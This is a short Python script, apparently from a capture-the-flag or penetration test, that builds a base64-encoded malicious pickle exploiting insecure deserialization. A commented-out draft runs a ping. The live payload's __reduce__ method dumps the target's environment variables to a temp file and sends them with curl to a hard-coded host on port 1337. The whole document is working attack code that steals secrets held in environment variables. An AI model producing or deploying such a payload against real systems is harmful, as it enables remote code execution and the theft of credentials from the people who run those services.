# import pickle
# import base64
# import os

# class EvilPickle(object):
#     def __reduce__(self):
#         return (os.system, ('ping 8.8.8.8',))

# evil_pickle = pickle.dumps(EvilPickle())
# print(base64.b64encode(evil_pickle).decode())


import pickle
import base64
import os

local_ip = "192.168.73.108"

class EvilPickle(object):
    def __reduce__(self):
        cmd = "/bin/bash -c 'env >/tmp/env_output'"
        send_cmd = f"curl -X POST -H 'Transfer-Encoding: chunked' -T /tmp/env_output http://{local_ip}:1337"
        return (os.system, (f'{cmd} && {send_cmd}',))

evil_pickle = pickle.dumps(EvilPickle())
print(base64.b64encode(evil_pickle).decode())